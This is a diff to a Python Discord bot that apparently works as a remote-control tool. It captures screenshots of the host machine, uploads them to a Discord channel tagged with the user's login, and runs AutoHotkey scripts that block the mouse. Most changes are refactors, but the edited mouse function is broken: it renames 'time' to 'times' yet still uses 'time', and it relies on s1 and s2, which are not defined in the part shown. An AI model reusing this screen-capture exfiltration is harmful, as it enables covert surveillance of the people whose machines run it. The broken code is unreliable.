@@ -92,11 +92,18 @@ id_fruits = [
 
 icon_url = f"https://cdn.discordapp.com/emojis/{id_fruits[randint(0, len(id_fruits) - 1)]}.png?v=1"
 
-
-# default_settings
 access_to_screen = True  # Разрешение на скрины
 screen_delay = 100  # delay of pause
 lost_screen_delay = screen_delay
+
+users_online = 0
+
+
+def default_settings():
+    global access_to_screen, screen_delay, lost_screen_delay
+    access_to_screen = True  # Разрешение на скрины
+    screen_delay = 100  # delay of pause
+    lost_screen_delay = screen_delay
 
 
 class Discord:
@@ -127,7 +134,7 @@ class Discord:
         else:
             screen_delay = 100
             lost_screen_delay = 100
-            await Discord.send_embed(description="Canceled!", status=False)
+            await Discord.send_embed(description="Unmuted!", status=False)
 
     @staticmethod
     async def index_online():
@@ -181,9 +188,10 @@ class Discord:
         if access_to_screen and status:
             try:
                 screenshot = ImageGrab.grab()
-                screenshot.save('screen.png', 'PNG')
-                urler = await client.send_file(Channel.buffer(), 'screen.png',
-                                               filename='screen.png', content="From **{login}**".format(login=login))
+                screenshot_name = 'screen.png'
+                screenshot.save(screenshot_name, 'PNG')
+                urler = await client.send_file(Channel.buffer(), screenshot_name,
+                                               filename=screenshot_name, content="From **{login}**".format(login=login))
                 link = ""
                 for i in urler.attachments:
                     link = i["url"]
@@ -990,12 +998,12 @@ class Scripts:
     @staticmethod
     async def mouse(message):
         settings = Scripts.get_settings(message.content)
-        time = Settings.seconds(settings)
-        script = """Loop {times}{s1}
+        times = Settings.seconds(settings)
+        script = f"""Loop {times}{s1}
                 hHookMouse := BlockMouse()
                 sleep 1000
                 {s2}
-                """.format(s1=s1, s2=s2, times=time)
+                """
         await Scripts.ahk(script, "mouse.ahk", description="!mouse {time}s".format(time=time))
 
     """
